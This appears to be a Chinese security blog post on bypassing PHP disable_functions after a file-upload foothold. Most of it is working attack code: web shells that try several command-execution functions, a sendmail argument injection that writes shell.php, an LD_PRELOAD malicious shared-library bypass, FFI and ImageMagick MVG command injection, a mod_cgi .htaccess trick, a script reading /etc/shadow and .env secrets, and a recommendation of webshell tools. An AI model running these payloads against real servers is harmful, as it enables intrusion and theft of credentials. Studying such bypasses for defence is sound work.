---
title: "PHP 文件上传后绕过 disable\_functions 获取回显"
description: "文件上传漏洞的审计思路与常见绕过方式。"
publishDate: "2026-01-25T10:23:39+08:00"
ogImage: "https://s3.bmp.ovh/2026/02/05/V8bcMQEh.png"
categories: ["Code Audit"]
tags: ["文件上传", "代码审计"]
---

# PHP 文件上传后绕过 disable\_functions 获取回显



## 确认 PHP 是否被解析

先排除是否是 PHP 根本没被执行的问题。

```php
<?php
echo "PHP is working!";
?>
```

### 检测 PHP 版本

```php
<?php
phpinfo();
?>

#**如果 phpinfo() 也被禁用，试试这个：**
<?php
echo PHP_VERSION;
echo "<br>";
echo PHP_OS;
?>
```



---

## 探测禁用了哪些函数

```php
<?php
header('Content-Type: text/plain; charset=utf-8');

// 获取禁用函数列表
$disabled = ini_get('disable_functions');
echo "=== 禁用的函数 ===\n";
echo $disabled ? $disabled : "没有禁用函数";
echo "\n\n";

// 获取禁用的类
$disabled_classes = ini_get('disable_classes');
echo "=== 禁用的类 ===\n";
echo $disabled_classes ? $disabled_classes : "没有禁用类";
echo "\n\n";

// 检测 open_basedir
echo "=== open_basedir ===\n";
echo ini_get('open_basedir') ?: "未设置";
echo "\n\n";

// 检测安全模式（PHP < 5.4）
echo "=== 安全模式 ===\n";
echo ini_get('safe_mode') ? "开启" : "关闭";
echo "\n\n";

// 检测可用的危险函数
$dangerous_functions = [
    'system', 'exec', 'shell_exec', 'passthru', 'popen', 'proc_open',
    'pcntl_exec', 'pcntl_fork', 'putenv', 'ini_set', 'dl',
    'mail', 'imap_open', 'error_log', 'mb_send_mail',
    'assert', 'create_function', 'call_user_func', 'call_user_func_array',
    'array_map', 'array_filter', 'usort', 'uasort', 'uksort',
    'include', 'require', 'file_get_contents', 'file_put_contents',
    'fopen', 'fread', 'fwrite', 'readfile', 'file', 'glob',
    'scandir', 'opendir', 'readdir'
];

echo "=== 函数可用性检测 ===\n";
foreach ($dangerous_functions as $func) {
    $status = function_exists($func) ? "✓ 可用" : "✗ 不可用";
    echo "$func: $status\n";
}

// 检测扩展
echo "\n=== 已加载扩展 ===\n";
$extensions = get_loaded_extensions();
echo implode(", ", $extensions);
?>
```

---

## 根据可用函数尝试执行命令

### 3\.1 常规命令执行函数

```php
<?php
$cmd = "whoami";  // 或 "id" (Linux)

// 方法1: system
if (function_exists('system')) {
    system($cmd);
}

// 方法2: exec
elseif (function_exists('exec')) {
    echo exec($cmd);
}

// 方法3: shell_exec
elseif (function_exists('shell_exec')) {
    echo shell_exec($cmd);
}

// 方法4: passthru
elseif (function_exists('passthru')) {
    passthru($cmd);
}

// 方法5: popen
elseif (function_exists('popen')) {
    $handle = popen($cmd, 'r');
    echo fread($handle, 4096);
    pclose($handle);
}

// 方法6: proc_open
elseif (function_exists('proc_open')) {
    $descriptorspec = [
        0 => ["pipe", "r"],
        1 => ["pipe", "w"],
        2 => ["pipe", "w"]
    ];
    $process = proc_open($cmd, $descriptorspec, $pipes);
    echo stream_get_contents($pipes[1]);
    proc_close($process);
}

// 方法7: pcntl_exec (需要 pcntl 扩展)
elseif (function_exists('pcntl_exec')) {
    pcntl_exec("/bin/bash", ["-c", $cmd]);
}
?>
```

---



### 3\.2 反引号执行

```php
<?php
echo `whoami`;
echo `id`;
echo `ls -la`;
?>
```

---



### 3\.3 利用 mail\(\) 函数

如果 `mail()` 可用：

```php
<?php
// 通过 mail 的第五个参数注入
// 需要 sendmail 支持
mail("a@b.com", "", "", "", "-X/var/www/html/shell.php -OQueueDirectory=/tmp -OLogLevel=0");
?>
```

---



### 3\.4 利用 putenv \+ mail / imap\_open（LD\_PRELOAD 绕过）

**这是常用的绕过方法！原理解释来自权威的Deepseek**



- **`LD_PRELOAD`**** 机制:**

`LD_PRELOAD` 是 Linux 动态链接器（`ld-linux.so`）支持的环境变量，它允许用户指定一个或多个共享库，这些库会在程序正常加载的库之前被载入。利用这一特性，攻击者可以劫持程序中的标准 C 库函数（如 `getuid`、`write` 等）\[ Technology A \]，本例中利用共享库的构造函数（constructor）\[Technology B\]。

在 GCC 中，`attribute((constructor))` 修饰的函数会在共享库被加载时（即 `dlopen` 或程序启动时）自动执行，且早于 `main` 函数。因此，只要恶意库被 `LD_PRELOAD` 加载，构造函数中的代码便会在目标进程启动时运行，无需依赖任何函数劫持。



- **PHP 中触发外部程序调用的函数**

要使 `LD_PRELOAD` 生效，必须有一个 PHP 函数能够创建新进程调用外部二进制程序。常见的选择有：

- `mail()`：最常用。在配置了 `sendmail_path`（默认 `/usr/sbin/sendmail`）时，`mail()` 函数会通过 `popen` 或 `execvp` 调用外部邮件传输代理（如 `sendmail`、`postfix`）。

- `error_log()`：当第一个参数为 `""` 且第二个参数为 `1`（即 `error_log("", 1, "", "")`）时，该函数会调用 `sendmail` 发送一封邮件，本质上与 `mail()` 行为相同。

- `imap_open()`：部分资料提及它也可用于触发，但需要谨慎分析。`imap_open` 主要用于 IMAP 协议通信，通常不直接产生外部进程。但在某些 PHP 环境下（如启用 `imap` 扩展且编译时链接了 `c-client` 库），`imap_open` 可能调用 `/usr/bin/imapd` 或其他辅助程序，但这并非标准行为。多数可靠案例中仍以 `mail`/`error_log` 为首选，若 `mail` 被禁用，`error_log` 常作为备选。



#### 步骤 1：编写恶意 \.so 文件

在你自己的 Linux 机器上编译：

```c
// bypass.c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void payload() {
    system("whoami > /var/www/html/output.txt");
}

__attribute__((constructor)) void run() {
    payload();
}
```

编译：

```bash
gcc -shared -fPIC bypass.c -o bypass.so
```



#### 步骤 2：上传 \.so 文件

将 `bypass.so` 上传到服务器



#### 步骤 3：利用 PHP 加载

```php
<?php
// 上传的 bypass.so 路径
$so_path = "/var/www/html/uploads/bypass.so";

// 设置 LD_PRELOAD
putenv("LD_PRELOAD=" . $so_path);

// 触发执行（需要调用外部程序）
if (function_exists('mail')) {
    mail("a@b.com", "", "", "");
} elseif (function_exists('imap_open')) {
    imap_open('{}', '', '');
} elseif (function_exists('error_log')) {
    error_log("", 1, "", "");
}

// 读取结果
echo file_get_contents("/var/www/html/output.txt");
?>
```

---



### 3\.5 利用 FFI（PHP 7\.4\+）

- What is FFI？Still Deepseek\.

FFI 全称 Foreign Function Interface（外部函数接口）。

在 PHP 普通模式下，调用系统命令只能依赖 PHP 内置的函数（如 `exec`、`system`）或通过 `shell_exec`。如果这些函数被 `disable_functions` 禁用了，就没办法了。

而 FFI 扩展 允许 PHP 脚本直接在代码里声明 C 语言的函数原型，然后像调用 C 函数一样去调用它。它本质上是一个 JIT（即时编译）风格的桥梁，让 PHP 拥有像 Python Ctypes 或 LuaJIT FFI 一样的能力。

- **FFI 的启用条件**

在生产环境中极难生效，因为 PHP 官方对 FFI 的启用有严格的安全分级。在 `php.ini` 中，配置项 `ffi.enable` 有三个可选值：

1. `ffi.enable = Off`（默认值，绝大多数生产环境）
完全禁用，调用 `FFI::cdef()` 会直接抛出致命错误 `FFI\Exception: FFI is not enabled`。你的代码连解析都过不去。

2. `ffi.enable = On`（极危险，仅在开发/调试环境）
允许在所有 PHP 脚本中使用 FFI。如果生产环境开了这个，等于把服务器裸奔。任何一个文件上传漏洞配合这段代码，服务器立刻沦陷。

3. `ffi.enable = Preload`（PHP 7\.4\+ 引入的特殊模式）
仅允许在 OPcache Preloading（预加载） 脚本中使用 FFI。它允许管理员指定一个PHP文件（如 `preload.php`），这个文件会在 PHP\-FPM 或 Web服务器启动时被解析并加载到共享内存中。普通 Web 请求（如通过 Nginx/FPM 访问的 `.php` 文件）无法调用 FFI，因此利用失败。



如果启用了 FFI 扩展：

```php
<?php
$ffi = FFI::cdef("int system(const char *command);");
$ffi->system("whoami > /tmp/output.txt");
echo file_get_contents("/tmp/output.txt");
?>
```



---



### 3\.6 利用 ImageMagick

```php
<?php
// 创建恶意 MVG 文件
$payload = 'push graphic-context
viewbox 0 0 640 480
fill "url(https://example.com/image.jpg|ls -la > /var/www/html/output.txt)"
pop graphic-context';

file_put_contents('/tmp/exploit.mvg', $payload);
$img = new Imagick('/tmp/exploit.mvg');
?>
```



---

### 3\.7 利用 GC UAF 漏洞（PHP 7\.0\-7\.3）

适用于特定 PHP 版本，上传利用脚本：

```php
<?php
# PHP 7.0-7.3 disable_functions bypass
# https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php
# 直接使用公开的 exploit 代码
?>
```

GitHub 搜索：`php disable_functions bypass`

---



### 3\.8 利用 Apache Mod\_CGI

如果是 Apache 且支持 CGI：

```php
<?php
// 创建 .htaccess
$htaccess = "Options +ExecCGI\nAddHandler cgi-script .xxx";
file_put_contents('.htaccess', $htaccess);

// 创建 CGI 脚本
$cgi = "#!/bin/bash\necho 'Content-Type: text/html'\necho ''\nwhoami";
file_put_contents('shell.xxx', $cgi);
chmod('shell.xxx', 0755);
?>
```

然后访问 `shell.xxx`



---

## 不执行命令，只读文件

如果命令执行被完全禁用，尝试读取敏感文件：

```php
<?php
header('Content-Type: text/plain');

// 读取配置文件
$files = [
    '/etc/passwd',
    '/etc/shadow',
    '/var/www/html/config.php',
    '/var/www/html/.env',
    '../config.php',
    '../.env',
    '../../config/database.php',
];

foreach ($files as $file) {
    echo "=== $file ===\n";
    if (file_exists($file) && is_readable($file)) {
        echo file_get_contents($file);
    } else {
        echo "无法读取\n";
    }
    echo "\n\n";
}

// 列目录
echo "=== 当前目录 ===\n";
print_r(scandir('.'));

echo "\n=== 上级目录 ===\n";
print_r(scandir('..'));
?>
```



---



## 使用现成的 Webshell

这些工具有内置的 disable\_functions 绕过模块：

1. **蚁剑 \(AntSword\)**：插件市场有 "绕过disable\_functions" 插件

2. **冰蝎 \(Behinder\)**：内置多种绕过方式

3. **哥斯拉 \(Godzilla\)**：支持多种绕过

    

---





## 一键探测脚本



上传这个完整探测脚本：



```php
<?php
error_reporting(0);
header('Content-Type: text/html; charset=utf-8');
echo "<pre>";

echo "========== PHP 环境信息 ==========\n";
echo "PHP 版本: " . PHP_VERSION . "\n";
echo "操作系统: " . PHP_OS . "\n";
echo "当前用户: " . get_current_user() . "\n";
echo "当前目录: " . getcwd() . "\n\n";

echo "========== 禁用函数 ==========\n";
echo ini_get('disable_functions') ?: "无\n";
echo "\n\n";

echo "========== 命令执行测试 ==========\n";
$cmd = PHP_OS == 'WINNT' ? 'whoami' : 'id';

$methods = [
    'system' => function($c) { ob_start(); system($c); return ob_get_clean(); },
    'exec' => function($c) { exec($c, $o); return implode("\n", $o); },
    'shell_exec' => function($c) { return shell_exec($c); },
    'passthru' => function($c) { ob_start(); passthru($c); return ob_get_clean(); },
    'popen' => function($c) { $h = popen($c, 'r'); $r = fread($h, 4096); pclose($h); return $r; },
    'backtick' => function($c) { return `$c`; },
];

foreach ($methods as $name => $func) {
    echo "$name: ";
    try {
        if (!function_exists($name) && $name != 'backtick') {
            echo "函数不存在\n";
            continue;
        }
        $result = $func($cmd);
        echo $result ? trim($result) . " ✓\n" : "无输出\n";
    } catch (Exception $e) {
        echo "失败\n";
    }
}

echo "\n========== 绕过可能性 ==========\n";
$bypass = [];
if (function_exists('putenv')) $bypass[] = "putenv 可用";
if (function_exists('mail')) $bypass[] = "mail 可用 (LD_PRELOAD)";
if (function_exists('imap_open')) $bypass[] = "imap_open 可用 (LD_PRELOAD)";
if (function_exists('error_log')) $bypass[] = "error_log 可用";
if (extension_loaded('ffi')) $bypass[] = "FFI 扩展可用";
if (class_exists('Imagick')) $bypass[] = "ImageMagick 可用";

echo $bypass ? implode("\n", $bypass) : "暂无发现可用绕过方法";
echo "</pre>";
?>
```



---



